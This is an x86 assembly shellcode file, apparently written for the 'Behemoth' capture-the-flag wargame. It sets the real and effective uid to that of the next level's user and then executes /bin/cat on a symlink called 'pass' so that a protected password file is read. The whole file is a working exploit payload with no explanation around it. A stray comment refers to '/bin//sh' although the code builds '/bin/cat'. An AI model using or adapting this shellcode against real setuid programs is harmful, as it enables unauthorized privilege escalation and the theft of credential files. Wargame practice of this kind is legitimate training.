.intel_syntax noprefix

#https://en.wikibooks.org/wiki/X86_Assembly/Interfacing_with_Linu://en.wikibooks.org/wiki/X86_Assembly/Interfacing_with_Linux 

.global setreuid_cat

setreuid_cat:
xor 	eax, eax
mov 	al, 70			# setreuid syscall on 32 bit Linux (/usr/include/asm/unistd_32.h)
xor 	ebx, ebx
mov 	bx, 13002		# real uid - behemoth2
xor 	cx, cx
mov 	cx, 13002		# effective uid - behemoth2
int  	0x80
xor 	eax, eax		# clear eax
push 	eax
push 	0x7461632f		# /cat
push    0x6e69622f		# /bin
mov 	ebx, esp		# place the pointer (esp) to the "/bin//sh" to ebx
push 	eax				# NULL termination on "pass"
push    0x73736170		# pass - which should be a softlink in curr dir to the file we want to cat	
mov 	edx, esp		# save pointer to "pass"
push 	eax				# NULL terminate argv
push 	edx 			# argv [1] "pass"
push 	ebx 			# argv [0] "/bin/cat"
mov     ecx, esp		# argv**
mov 	edx, eax		# place 0 to env pointer
mov 	al, 0xb			# execve syscall number (11 on 32bit Linux)
int 	0x80
#xor 	eax, eax 		# clear eax (make it zero)
#inc 	eax 			# place 1 into eax (exit syscall number)
#int 	0x80
